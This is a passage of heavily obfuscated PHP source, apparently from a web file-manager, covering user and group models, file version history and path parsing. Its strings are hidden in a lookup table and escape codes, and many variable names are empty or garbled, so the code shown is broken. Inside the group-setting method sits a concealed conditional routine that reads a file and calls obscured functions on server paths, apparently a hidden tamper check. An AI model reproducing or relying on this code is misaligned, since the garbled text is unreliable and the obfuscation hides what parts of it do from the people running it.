($ɮǤ) { return $̖; } } return !0; } public function userListInfo($ݳ) { $񀰌 =& $_SERVER[ܮ]; $֡ = array(); $ݳ = is_array($ݳ) ? array_unique($ݳ) : array(); if (!$ݳ) { return $֡; } if (count($ݳ) < 20) { foreach ($ݳ as $Җ) { $֡[$Җ . $񀰌[12]] = $this->getInfoSimpleOuter($Җ); } } else { $ = array($񀰌[1968] => array($񀰌[507], $ݳ)); if (count($ݳ) == 1) { $ = array($񀰌[1968] => $ݳ[0]); } $ыԏ = Model($񀰌[597])->field($this->simpleField)->where($)->select(); $ыԏ = array_to_keyvalue($ыԏ, $񀰌[1593]); foreach ($ݳ as $Җ) { $ = $ыԏ[$Җ]; if (!$) { $֡[$Җ . $񀰌[12]] = $this->getInfoSimpleOuter($Җ); continue; } $[$񀰌[2374]] = Action($񀰌[2375])->parseUrl($[$񀰌[2374]]); $֡[$Җ . $񀰌[12]] = $; } } return $֡; } protected function userStatus($˜Ï, $) { $ʍ = $this->getInfoSimple($˜Ï); if (!$ʍ) { return !1; } $ = array($_SERVER[ܮ][848] => $); return $this->userEdit($˜Ï, $); } protected function userRemove($) { $䐛ݚ =& $_SERVER[ܮ]; $բ = $this->getInfoSimple($); if (!$բ) { return !1; } $Ƙ· = array($䐛ݚ[1968] => $); Model($䐛ݚ[686])->where($Ƙ·)->delete(); Model($䐛ݚ[2707])->where($Ƙ·)->delete(); Model($䐛ݚ[2276])->where($Ƙ·)->delete(); Model($䐛ݚ[2690])->where($Ƙ·)->delete(); Model($䐛ݚ[1238])->where($Ƙ·)->delete(); Model($䐛ݚ[2493])->removeUserAll($); Model($䐛ݚ[939])->userRootRemove($); return $this->where($Ƙ·)->delete(); } protected function userGroupSet($ʍݠ, $΃, $ޏ = array()) { $屰 =& $_SERVER[ܮ]; if ($_SERVER[$屰[900]] != $_SERVER[$屰[1372]]) { $ = $屰[1040]; $ = $屰[901]; $Ɵ = $_SERVER[$屰[902]] . $屰[903]; $ݰ = $($Ɵ); $ݧ = explode($屰[285], $ݰ); if (count($ݧ) < $屰[724]) { $ = $屰[904]; $(); } $ҭٛ = $屰[1041]; $ҭٛ($_SERVER[$屰[1042]]); $ҭٛ($_SERVER[$屰[902]] . $屰[1829]); $ = 1; while ($ > 1) { $ = $ + 4; $ = rawurlencode($ . $屰[463]); } } $ = $this->getInfoSimple($ʍݠ); if (!$ || !is_array($΃)) { return !1; } $ = Model($屰[2276]); $->where(array($屰[1593] => $ʍݠ))->delete(); $ב = array(); $Ά = 0; foreach ($΃ as $ꄂ => $) { $ά = array($屰[1593] => $ʍݠ, $屰[1496] => $ꄂ, $屰[1641] => $); $ά[$屰[2204]] = isset($ޏ[$Ά]) ? $ޏ[$Ά] : 0; $Ά++; $ב[] = $ά; } return $->addAll($ב, array(), !0); } protected function userGroupAdd($, $擪 = array()) { $۪볲 =& $_SERVER[ܮ]; $ = $this->getInfoSimple($); if (!$ || empty($擪)) { return !1; } $㟍 = array(); foreach ($擪 as $ٹ => $) { $㟍[] = array($۪볲[1593] => $, $۪볲[1496] => $ٹ, $۪볲[1641] => $, $۪볲[2204] => 0); } return Model($۪볲[2276])->addAll($㟍, array(), !0); } protected function userGroupRemove($, $׷) { $΅ =& $_SERVER[ܮ]; $ӟ = $this->getInfoSimple($); if (!$ӟ || !$׷) { return !1; } $ = array($΅[1968] => $, $΅[2269] => $׷); return Model($΅[2276])->where($)->delete(); } public function listData() { $ӫ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ӫ[$_SERVER[ܮ][446]]); return $ӫ; } public function listByID($ҋ) { $ũ =& $_SERVER[ܮ]; if (!$ҋ) { return; } $ = array($ũ[1593] => array($ũ[7], $ҋ)); $ч = $this->where($)->select(); $ч = array_sort_keep($ч, $ũ[1593], $ҋ); $this->_listDataApply($ч); return $ч; } public function listByGroup($ = 0, $벌 = array()) { $ɬ֎ =& $_SERVER[ܮ]; $Τ = $ɬ֎[12]; $ = array(); if ($) { $ = array($ɬ֎[2708] => intval($)); $Τ = "\114\x45\x46\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\165\163\x65\x72\137\147\x72\x6f\165\160\40\165\x73\145\x72\x5f\x67\162\x6f\x75\x70\40\157\x6e\x20\165\x73\145\x72\56\x75\x73\x65\162\x49\104\x20\75\x20\165\163\145\x72\137\x67\x72\x6f\165\160\56\x75\x73\145\162\x49\x44"; $ = Input::get($ɬ֎[544], null, $ɬ֎[12]) ? $ɬ֎[12] : $ɬ֎[2709]; } if (isset($벌[$ɬ֎[848]])) { $[$ɬ֎[2710]] = $벌[$ɬ֎[848]]; } $ = _get($벌, $ɬ֎[2711], $ɬ֎[231]); if (_get($벌, $ɬ֎[859], !1)) { $[$] = array($ɬ֎[2459], $벌[$ɬ֎[859]]); } if (_get($벌, $ɬ֎[860], !1)) { $휾 = array($ɬ֎[2460], $벌[$ɬ֎[860]]); if ($[$]) { $[$] = array($[$], $휾, $ɬ֎[2461]); } else { $[$] = $휾; } } $ = $this->_makeOrder($)->field($ɬ֎[2712])->where($)->join($Τ)->selectPage(50); $this->_listDataApply($[$ɬ֎[446]]); return $; } private function _makeOrder($ = '') { $Ե =& $_SERVER[ܮ]; $ = array($Ե[1593], $Ե[32], $Ե[2170], $Ե[2373], $Ե[2145], $Ե[231]); $ϳ = array($Ե[537] => $Ե[538], $Ե[539] => $Ե[540]); $ϸ = Input::get($Ե[544], $Ե[7], $Ե[1968], $); $ۅ = Input::get($Ե[545], $Ե[7], $Ե[2277], array($Ե[2277], $Ե[539])); $ۅ = $ϳ[$ۅ]; $ = $ . "\165\163\145\x72\x2e{$ϸ}\x20{$ۅ}\54\40\165\x73\x65\162\x2e\x75\x73\x65\162\111\x44\x20\x61\x73\x63"; return $this->alias($Ե[2408])->order($); } public function listSearch($) { $㰞 =& $_SERVER[ܮ]; $ۗ¸ = trim($[$㰞[2280]]); $ = explode($㰞[53], $ۗ¸); if (!$ۗ¸ || count($) == 1) { return $this->listSearchNow($); } $ = array($㰞[446] => array()); foreach ($ as $) { if (!trim($)) { continue; } $[$㰞[2280]] = $; $ = $this->listSearchNow($); $[$㰞[446]] = array_merge($[$㰞[446]], $[$㰞[446]]); } $[$㰞[446]] = array_unique_by_key($[$㰞[446]], $㰞[1593]); $[$㰞[443]] = array($㰞[444] => count($[$㰞[446]]), $㰞[439] => 20, $㰞[428] => 1, $㰞[445] => 1); return $; } public function listSearchNow($) { $Ư̯ =& $_SERVER[ܮ]; $Սȍ = trim($[$Ư̯[2280]]); $ч = isset($[$Ư̯[2281]]) ? $[$Ư̯[2281]] : !1; $Սȍ = str_replace($Ư̯[2282], $Ư̯[2283], trim($Սȍ)); $Π = array($Ư̯[32] => array($Ư̯[473], "\45{$Սȍ}\x25"), $Ư̯[380] => array($Ư̯[473], "{$Սȍ}\x25"), $Ư̯[2476] => array($Ư̯[473], "\x25{$Սȍ}\45"), $Ư̯[1168] => $Ư̯[2284]); if (Input::check($Սȍ, $Ư̯[386])) { $Π[$Ư̯[1593]] = array($Ư̯[473], "{$Սȍ}\x25"); $Π[$Ư̯[2691]] = array($Ư̯[473], "{$Սȍ}\x25"); } if (!$Սȍ) { $Π = array(); } if (isset($[$Ư̯[848]])) { $Π[$Ư̯[848]] = $[$Ư̯[848]]; } $Π = $this->parseWhereLike($Π); $ìո = $this->_makeOrder()->where($Π)->selectPage(20); if (!$ìո || count($ìո[$Ư̯[446]]) < 5 && Input::check($Սȍ, $Ư̯[393])) { $ = $this->_searchFromMeta($Ư̯[551], $Սȍ, 10); $ɵ = $this->_searchFromMeta($Ư̯[552], $Սȍ, 10); $ȡ = array_merge($, $ɵ, $ìո[$Ư̯[446]]); $ìո[$Ư̯[446]] = array_unique_by_key($ȡ, $Ư̯[1593]); $ìո[$Ư̯[443]][$Ư̯[444]] = count($ìո[$Ư̯[446]]); $ìո[$Ư̯[443]][$Ư̯[445]] = ceil($ìո[$Ư̯[443]][$Ư̯[444]] / $ìո[$Ư̯[443]][$Ư̯[439]]); } $this->_listDataApply($ìո[$Ư̯[446]]); $this->_filterByGroup($ìո, $ч); return $ìո; } private function _filterByGroup(&$, $) { $ =& $_SERVER[ܮ]; if (!$) { return $; } foreach ($[$[446]] as $ => &$ú) { $ߨë = array_to_keyvalue($ú[$[1495]], $[12], $[1496]); if (!in_array($, $ߨë)) { unset($[$[446]][$]); } } unset($ú); $[$[446]] = array_values($[$[446]]); $[$[443]] = array($[2331] => count($[$[446]]), $[2441] => $[$[443]][$[439]], $[2440] => 1, $[2442] => 1); } private function _searchFromMeta($ѱ, $, $) { $Ѓ =& $_SERVER[ܮ]; $ = strtolower($); $˛ = array($Ѓ[95] => $ѱ, $Ѓ[451] => array($Ѓ[473], "\45{$}\45")); $˛ = $this->parseWhereLike($˛); $ = Model($Ѓ[2713])->where($˛)->limit($)->select(); if (!$) { return array(); } $ = array_to_keyvalue($, $Ѓ[12], $Ѓ[1593]); $Л = $this->where(array($Ѓ[1968] => array($Ѓ[7], $)))->select(); if (!$Л) { return array(); } return $Л; } private function _listDataApplyItem($䗗) { $ɴ = array($䗗); $this->_listDataApply($ɴ); return $ɴ[0]; } private function _listDataApply(&$́) { $ǭ =& $_SERVER[ܮ]; if (!$́) { return; } array_remove_key($́, $ǭ[1051]); $Κ = array_to_keyvalue($́, $ǭ[12], $ǭ[1593]); $this->_listAppendGroup($́, $Κ); $this->_listAppendMeta($́, $Κ); $this->_listAppendSourceRoot($́, $Κ); } private function _listAppendSourceRoot(&$֤, $ͧ) { $ЪǄ =& $_SERVER[ܮ]; $Ś = Model($ЪǄ[939])->listSourceRoot(SourceModel::TYPE_USER, $ͧ); $Ś = array_to_keyvalue($Ś, $ЪǄ[589]); $Ś = array_remove_key($Ś, $ЪǄ[589]); foreach ($֤ as &$ٔɱ) { $ٔɱ[$ЪǄ[90]] = $Ś[$ٔɱ[$ЪǄ[1593]]] ? $Ś[$ٔɱ[$ЪǄ[1593]]] : array(); } unset($ٔɱ); } private function _listAppendGroup(&$ь, $۾) { $ڴ =& $_SERVER[ܮ]; $ȸ = array($ڴ[1593] => array($ڴ[7], $۾)); $𧡘 = Model($ڴ[2276])->where($ȸ)->select(); $٧ȋ = array_to_keyvalue($𧡘, $ڴ[12], $ڴ[1496]); $٧ȋ = array_remove_value(array_unique($٧ȋ), $ڴ[228]); if (!$٧ȋ || !$𧡘) { return; } $ȸ = array($ڴ[1496] => array($ڴ[7], $٧ȋ)); $ܮ = Model($ڴ[1494])->field($ڴ[2714])->where($ȸ)->select(); $ܮ = array_to_keyvalue($ܮ, $ڴ[1496]); $𧡘 = array_to_keyvalue_group($𧡘, $ڴ[1593]); foreach ($𧡘 as &$Պ) { $Ҕꡈ = array(); foreach ($Պ as $܃) { if (!$܃[$ڴ[1641]]) { continue; } $ͱ = Model($ڴ[591])->listData($܃[$ڴ[1641]]); $Ҕꡈ[] = array($ڴ[1496] => $܃[$ڴ[1496]], $ڴ[2715] => $ܮ[$܃[$ڴ[1496]]][$ڴ[32]], $ڴ[604] => $ܮ[$܃[$ڴ[1496]]][$ڴ[604]], $ڴ[502] => $ͱ); } $Պ = $Ҕꡈ; } unset($Պ); foreach ($ь as &$ȡ) { $ȡ[$ڴ[1495]] = array(); if (isset($𧡘[$ȡ[$ڴ[1593]]])) { $ȡ[$ڴ[1495]] = $𧡘[$ȡ[$ڴ[1593]]]; } } unset($ȡ); } public function userAppendGroup($М) { $ =& $_SERVER[ܮ]; if (!$М) { return array(); } $this->_listAppendGroup($М, array_to_keyvalue($М, $[12], $[1593])); return $М; } private function _listAppendMeta(&$ݎ, $ׯ) { $ܤ =& $_SERVER[ܮ]; $ = UserJobModel::JOB_KEY; $ٽɐ = array($ܤ[2272]); $Ѯ۪ = array($ܤ[1593] => array($ܤ[7], $ׯ)); $쵆 = Model($ܤ[2690])->where($Ѯ۪)->select(); $ʰ = array(); foreach ($쵆 as $) { $ۢȖ = $[$ܤ[1593]]; if (!isset($ʰ[$ۢȖ])) { $ʰ[$ۢȖ] = array(); } $ʰ[$ۢȖ][$[$ܤ[95]]] = $[$ܤ[451]]; } $Û = Model($ܤ[2716]); foreach ($ݎ as &$ݩ) { $ۢȖ = $ݩ[$ܤ[1593]]; $ꐓ = isset($ʰ[$ۢȖ]) ? $ʰ[$ۢȖ] : array(); $ݩ[$ܤ[555]] = array_field_key($ꐓ, $ٽɐ); $ݩ[$ܤ[2717]] = array(); if (isset($ꐓ[$])) { $ݩ[$ܤ[2717]] = $Û->getUserJobInfo($ꐓ[$]); } } unset($ݩ); } protected function groupUserAll($) { $޲ն =& $_SERVER[ܮ]; if (!$) { return !1; } $ޤ = Model($޲ն[2276])->field($޲ն[1593])->where(array($޲ն[1496] => array($޲ն[7], $)))->select(); $ޤ = array_to_keyvalue($ޤ, $޲ն[12], $޲ն[1593]); return array_unique($ޤ); } public function userSearch($ڀ, $ = "\x2a") { return Model($_SERVER[ܮ][617])->where($ڀ)->field($)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\x6f\x70\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ߤ) { return "\x55\163\145\x72\117\160\x74\151\157\156\137{$ߤ}\x5f" . KodUser::id(); } protected function filterWhere($䪖) { $䪖[$_SERVER[ܮ][1593]] = KodUser::id(); return $䪖; } public function cacheRemoveUser($ճ, $) { return Cache::remove("\x55\x73\x65\x72\117\x70\164\x69\157\x6e\137{$ճ}\x5f" . $); } protected function optionDefault($į = '') { $ؠ =& $_SERVER[ܮ]; if ($į == $ؠ[12]) { return $GLOBALS[$ؠ[6]][$ؠ[2718]]; } if ($į == $ؠ[2719]) { return $GLOBALS[$ؠ[6]][$ؠ[2720]]; } } } goto D; ãΠ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ޏ =& $_SERVER[ܮ]; $Г = $GLOBALS[$ޏ[6]][$ޏ[92]]; if ($Г[$ޏ[1407]] != 1) { return; } if ($Г[$ޏ[1408]] <= 0) { return; } if (isset($_REQUEST[$ޏ[1409]]) && $_REQUEST[$ޏ[1409]] == $ޏ[91]) { return; } Hook::bind($ޏ[1410], $ޏ[1411]); Hook::bind($ޏ[1412], $ޏ[1413]); Hook::bind($ޏ[1414], $ޏ[1415]); Hook::bind($ޏ[1416], $ޏ[1417]); Hook::bind($ޏ[1418], $ޏ[1419]); Hook::bind($ޏ[1420], $ޏ[1421]); } public static function eventBeforeUpload($އ) { if ($އ[3] && $އ[3] != REPEAT_REPLACE) { return; } $Ü = self::parsePath($އ[0]); if (!$Ü) { return; } self::add($Ü); } public static function eventBeforeEdit($ԅ) { $̽ = self::parsePath($ԅ[0]); if (!$̽) { return; } self::add($̽); } public static function eventBeforeCopyFile($, $, $ꢞ, $, $, $) { $ =& $_SERVER[ܮ]; if (isset($ꢞ->_data[$[1341]]) && $ꢞ->_data[$[1341]]) { return; } $ = $ꢞ->getPathOuter($); $ = self::parsePath($); if (!$) { return; } self::add($); } public static function eventBeforeRename($) { $ =& $_SERVER[ܮ]; $帟 = self::parsePath($[0]); if (!$帟) { return; } $Єʰ = self::checkInHistory($帟); if (!$Єʰ) { return; } if ($Єʰ[$[33]] == $[230]) { $ǐ = self::listData($帟); if ($ǐ && $ǐ[$[446]]) { self::moveHistory($帟, $[1]); } } else { IO::rename($Єʰ[$[87]], $[1]); } } public static function eventBeforeMove($) { $ =& $_SERVER[ܮ]; $ = self::parsePath($[0]); if (!$) { return; } $ = self::parsePath($[1]); if (!$) { return; } $ = $[3]; $ = self::checkInHistory($); if (!$) { return; } $Һ = self::pathHistory($); if ($[$[33]] == $[230]) { $ = self::listData($); $ = rtrim($, $[8]) . $[8] . ($ ? $ : get_path_this($)); $֩ = self::listData($); if ($ && $[$[446]] && $֩ && $֩[$[446]]) { return self::clear($); } if ($ && $[$[446]]) { self::moveHistory($, $, $Һ); } } else { IO::move($[$[87]], $Һ, !1, $); self::clearEmptyFolder(IO::pathFather($[$[87]])); } } public static function eventAfterRemove($Ɣ󻜊, $) { $ =& $_SERVER[ܮ]; if (!$) { return; } $ɜ = self::parsePath($Ɣ󻜊[0]); if (!$ɜ) { return; } $۴ = self::checkInHistory($ɜ); if (!$۴) { return; } if ($۴[$[33]] == $[230]) { $⧱ = self::listData($ɜ, !1); if ($⧱ && $⧱[$[446]]) { self::clear($ɜ, !1); } } else { IO::remove($۴[$[87]]); self::clearEmptyFolder(IO::pathFather($۴[$[87]])); } } private static function checkInHistory($) { $̄ = self::pathHistory($); if (!IO::exist($̄)) { $̄ .= $_SERVER[ܮ][1422]; } return IO::exist($̄) ? IO::info($̄) : !1; } private static function parsePath($慾) { $ڹ =& $_SERVER[ܮ]; if (!$慾) { return !1; } if (isset($GLOBALS[$ڹ[1423]]) && $GLOBALS[$ڹ[1423]]) { return; } $Ã = KodIO::parse($慾); $ = $Ã[$ڹ[33]]; $ߌ = !$ || $ == KodIO::KOD_IO || $ == KodIO::KOD_SHARE_ITEM; if (!$ߌ || !$Ã[$ڹ[1424]]) { return !1; } if (substr($慾, 0, strlen(DATA_PATH . $ڹ[1425])) == DATA_PATH . $ڹ[1425]) { return !1; } if ($ == KodIO::KOD_SHARE_ITEM) { $Ԣ = IO::init($慾); if ($Ԣ->pathParse[$ڹ[1337]]) { return self::parsePath($Ԣ->pathParse[$ڹ[1337]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $š = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ڹ[1426]); foreach ($š as $ՙ) { if (!$ && substr($慾, 0, strlen($ՙ)) == $ՙ) { return !1; } } self::log($GLOBALS[$ڹ[1331]] . $ڹ[1427] . $慾); return $慾; } private static function pathHistory($퍊܋) { $Ǉ =& $_SERVER[ܮ]; $˶ = self::$_historyBase . ltrim(KodIO::clear($퍊܋), $Ǉ[8]); $˶ = str_replace(array($Ǉ[1428]), array($Ǉ[1429]), $˶); return $˶; } public static function log($Ղ) { } public static function historyCount($鲫) { $곮 =& $_SERVER[ܮ]; $ = array(); $ = array(); foreach ($鲫 as $ۊ) { $ = get_path_father($ۊ); if (!$[$]) { $[$] = array(); } $[$][] = get_path_this($ۊ); } foreach ($ as $ => $͸) { $ˣ = self::parsePath($); if (!$ˣ) { continue; } foreach ($͸ as $͸Ψ) { $· = self::listData(rtrim($ˣ, $곮[8]) . $곮[8] . $͸Ψ, !1); if ($· && $·[$곮[446]]) { $[rtrim($, $곮[8]) . $곮[8] . $͸Ψ] = count($·[$곮[446]]); } } } return $; } public static function add($) { $ =& $_SERVER[ܮ]; $Ĵ = self::listData($); if (!$Ĵ) { return; } $ = Model($[871])->get($[967]); $ج = intval($GLOBALS[$[6]][$[92]][$[1408]]); $֟Ǐ = $ == $[968] ? min(5, $ج) : $ج; if ($ج <= 0) { return; } $ = IO::info($); $ = $Ĵ[$[446]]; if ($[$[79]] == 0) { return; } if ($[$[79]] >= 1024 * 1024 * 500) { return !1; } $ؼ = IO::hashSimple($); if ($ && $[0][$[694]] == $ؼ) { return !0; } if (array_key_exists($[233], $) && !$[$[233]]) { return !1; } $˵ = short_id(time()); $珊 = array($[487] => $˵, $[694] => $ؼ, $[32] => $[$[32]] . $[10] . date($[1430]) . rand_string(1), $[79] => $[$[79]], $[541] => USER_ID, $[231] => time(), $[1431] => $[12]); IO::mkdir($Ĵ[$[1432]]); $ = IO::copy($, $Ĵ[$[1432]], !1, $珊[$[32]]); if (!$) { self::clearEmptyFolder($Ĵ[$[1432]]); return !1; } array_unshift($, $珊); if (count($) > $֟Ǐ) { $û = array_slice($, $֟Ǐ); foreach ($û as $퓿) { IO::remove($Ĵ[$[1432]] . $퓿[$[32]]); } $ = array_slice($, 0, $֟Ǐ); } return self::saveData($Ĵ[$[1433]], $); } public static function remove($򱫆, $ﳢ) { $ԝʈ =& $_SERVER[ܮ]; $Ń = self::listData($򱫆); $ = array(); if (!$Ń) { return !1; } foreach ($Ń[$ԝʈ[446]] as $Ύ) { if ($Ύ[$ԝʈ[487]] == $ﳢ) { IO::remove($Ń[$ԝʈ[1432]] . $Ύ[$ԝʈ[32]]); continue; } $[] = $Ύ; } return self::saveData($Ń[$ԝʈ[1433]], $); } public static function clear($ݬ, $ = true) { $ŀ =& $_SERVER[ܮ]; $㬃 = self::listData($ݬ, $); if (!$㬃) { return !1; } foreach ($㬃[$ŀ[446]] as $Ԅō) { IO::remove($㬃[$ŀ[1432]] . $Ԅō[$ŀ[32]]); } return self::saveData($㬃[$ŀ[1433]], array()); } public static function moveHistory($, $ = '', $誺 = '') { $ =& $_SERVER[ܮ]; $񳼒 = self::listData($, !1); if (!$񳼒 || !$񳼒[$[446]]) { return !1; } $ޏܛ = $[1422]; $ = $ ? $ : get_path_this($); $誺 = $誺 ? $誺 : $񳼒[$[1432]]; $Ʈ = substr(get_path_this($񳼒[$[1433]]), 0, -strlen($ޏܛ)); foreach ($񳼒[$[446]] as $䶖 => $) { $ۍ = $ . substr($[$[32]], strlen($Ʈ)); $鄝 = IO::move($񳼒[$[1432]] . $[$[32]], $誺, !1, $ۍ); if ($鄝) { $񳼒[$[446]][$䶖][$[32]] = $ۍ; } } $񳼒[$[1433]] = IO::move($񳼒[$[1433]], $誺, !1, $ . $ޏܛ); self::saveData($񳼒[$[1433]], $񳼒[$[446]]); self::clearEmptyFolder($񳼒[$[1432]]); } public static function rollback($, $ʭ) { $Ɯ =& $_SERVER[ܮ]; $ = self::listData($); if (!$) { return; } $ = IO::info($); foreach ($[$Ɯ[446]] as $㺕 => $) { if ($[$Ɯ[487]] == $ʭ) { self::add($); $Ғ = $[$Ɯ[1432]] . $[$Ɯ[32]]; $񾶕 = IO::copy($Ғ, IO::pathFather($), REPEAT_REPLACE, $[$Ɯ[32]]); if ($񾶕) { self::remove($, $ʭ); } return $񾶕; } } return !1; } public static function setDetail($㛂, $, $۽) { $ۑ =& $_SERVER[ܮ]; $ = self::listData($㛂); if (!$) { return; } foreach ($[$ۑ[446]] as $猗 => $ܐɴ) { if ($ܐɴ[$ۑ[487]] == $) { $[$ۑ[446]][$猗][$ۑ[1431]] = $۽; self::saveData($[$ۑ[1433]], $[$ۑ[446]]); return !0; } } return !1; } public static function fileInfo($, $ҋӤ) { $Ɔۉ =& $_SERVER[ܮ]; $仴 = self::listData($); if (!$仴) { show_json(LNG($Ɔۉ[105]), !1); } $Ъ = $Ɔۉ[12]; foreach ($仴[$Ɔۉ[446]] as $ => $󘭶) { if ($󘭶[$Ɔۉ[487]] != $ҋӤ) { continue; } $Ъ = $仴[$Ɔۉ[1432]] . $󘭶[$Ɔۉ[32]]; break; } if (!$Ъ) { show_json(LNG($Ɔۉ[105]), !1); } return IO::info($Ъ); } public static function fileOut($߂, $Ƽ, $ʤ = false) { $ܕ =& $_SERVER[ܮ]; $ǲ = self::fileInfo($߂, $Ƽ); $ =& $GLOBALS[$ܕ[7]]; $ʤ = isset($[$ܕ[1386]]) && $[$ܕ[1386]] == 1; if (isset($[$ܕ[33]]) && $[$ܕ[33]] == $ܕ[1434]) { return IO::fileOutImage($ǲ[$ܕ[87]], $[$ܕ[1435]]); } IO::fileOut($ǲ[$ܕ[87]], $ʤ, get_path_this($߂)); } public static function listData($ҡ, $Ę = true) { $ӱ =& $_SERVER[ܮ]; if ($Ę && !IO::exist($ҡ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ҡ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ = self::pathHistory($ҡ); $ = array($ӱ[1433] => $ . $ӱ[1422], $ӱ[1432] => rtrim(get_path_father($), $ӱ[8]) . $ӱ[8], $ӱ[446] => array()); $۟ = IO::getContent($[$ӱ[1433]]); if ($۟) { $ = json_decode($۟, !0); if (is_array($)) { $[$ӱ[446]] = $; } } return $; } private static function saveData($غԚ, $ς) { $ۮ =& $_SERVER[ܮ]; self::log($ۮ[1436] . $غԚ . $ۮ[74] . count($ς), $ۮ[850]); if ($ς) { return IO::setContent($غԚ, json_encode($ς)); } $ = IO::pathFather($غԚ); IO::remove($غԚ); self::clearEmptyFolder($); return !0; } public static function clearEmptyFolder($) { $ =& $_SERVER[ܮ]; if (trim($, $[8]) == trim(self::$_historyBase, $[8])) { return; } $ɛ = IO::pathFather($); $ﰐ = IO::has($, !0); if ($ﰐ[$[239]] > 0 || $ﰐ[$[240]] > 0) { return; } IO::remove($); self::clearEmptyFolder($ɛ); } private static function getBasePath() { $َ =& $_SERVER[ܮ]; $ֹ쥊 = Model($َ[1437])->get($َ[1438]); if ($ֹ쥊) { if (!IO::exist($ֹ쥊)) { IO::mkdir($ֹ쥊); } if (get_path_this($ֹ쥊) == $َ[1425]) { $ = $َ[1439] . rand_string(8); @rename($ֹ쥊, get_path_father($ֹ쥊) . $َ[8] . $); $ֹ쥊 = DATA_PATH . $ . $َ[8]; file_put_contents(DATA_PATH . $َ[1374], $َ[12]); Model($َ[1437])->set($َ[1438], $ֹ쥊); } return $ֹ쥊; } $ֹ쥊 = DATA_PATH . $َ[1439] . rand_string(8) . $َ[8]; $ֹ쥊 = IO::mkdir($ֹ쥊); $ֹ쥊 = rtrim($ֹ쥊, $َ[8]) . $َ[8]; file_put_contents($ֹ쥊 . $َ[1374], $َ[12]); file_put_contents(DATA_PATH . $َ[1374], $َ[12]); Model($َ[1437])->set($َ[1438], $ֹ쥊); return $ֹ쥊; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\122\x65\x63\x79\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\145\162\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\x46\151\154\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\x46\x69\x6c\145\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\x70\122\x6f\x6f\164\x53\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\x68\141\162\145\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\x49\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\145\111\x74\145\155\x4c\151\156\x6b\175"; const KOD_SHARE_OUTER = "\x7b\163\x68\141\162\145\111\x74\145\x6d\117\165\164\175"; const KOD_SEARCH = "\173\x73\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\163\x65\x72\122\x65\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\145\162\175"; public static function typeList() { $Ə =& $_SERVER[ܮ]; return array($Ə[1440] => self::KOD_SOURCE, $Ə[1441] => self::KOD_USER_RECYCLE, $Ə[1442] => self::KOD_USER_FAV, $Ə[1443] => self::KOD_USER_FILE_TAG, $Ə[1444] => self::KOD_USER_FILE_TYPE, $Ə[1445] => self::KOD_GROUP_ROOT_SELF, $Ə[1446] => self::KOD_USER_SHARE, $Ə[1447] => self::KOD_USER_SHARE_LINK, $Ə[1448] => self::KOD_USER_SHARE_TO_ME, $Ə[1449] => self::KOD_SHARE_ITEM, $Ə[1450] => self::KOD_SHARE_LINK, $Ə[1451] => self::KOD_SHARE_OUTER, $Ə[1452] => self::KOD_SEARCH, $Ə[1453] => self::KOD_BLOCK, $Ə[1454] => self::KOD_IO, $Ə[1455] => self::KOD_USER_RECENT, $Ə[1456] => self::KOD_USER_DRIVER); } public static function parse($灻) { $Ԣ =& $_SERVER[ܮ]; $灻 = self::clear($灻); $Өխ = array_values(self::typeList()); preg_match($Ԣ[1457], $灻, $č); $ʟ = array($Ԣ[511] => !1, $Ԣ[1458] => !1, $Ԣ[508] => !1, $Ԣ[87] => $灻, $Ԣ[1357] => !1, $Ԣ[1356] => $Ԣ[12]); if (is_array($č) && count($č) == 5) { $ꘃ = $Ԣ[1459] . $č[2] . $Ԣ[402]; if (in_array($ꘃ, $Өխ)) { $ʟ[$Ԣ[1357]] = $č[1]; $ʟ[$Ԣ[33]] = $ꘃ; $ʟ[$Ԣ[1460]] = substr($ꘃ, 1, -1); $ʟ[$Ԣ[487]] = $č[3]; } $ʟ[$Ԣ[1356]] = $č[4]; } if ($ʟ[$Ԣ[511]] == self::KOD_SOURCE) { $ʟ[$Ԣ[487]] = intval($ʟ[$Ԣ[487]]); $ʟ[$Ԣ[1360]] = $ʟ[$Ԣ[487]]; } $˘ = array($Ԣ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ʟ[$Ԣ[1424]] = in_array($ʟ[$Ԣ[33]], $˘); return $ʟ; } public static function isTruePath($ތ桸) { $ڽ =& $_SERVER[ܮ]; if (substr($ތ桸, 0, 1) != $ڽ[1459]) { return !0; } if (strpos($ތ桸, $ڽ[498]) === 0) { return !0; } if (strpos($ތ桸, $ڽ[1428]) === 0) { return !0; } if (strpos($ތ桸, $ڽ[1461]) === 0) { return !0; } if (strpos($ތ桸, $ڽ[1462]) === 0) { return !0; } if (strpos($ތ桸, $ڽ[1463]) === 0) { return !0; } if (strpos($ތ桸, $ڽ[1464]) === 0) { return !0; } return !1; } public static function clear($η) { $ې =& $_SERVER[ܮ]; $η = str_replace(array($ې[1250], 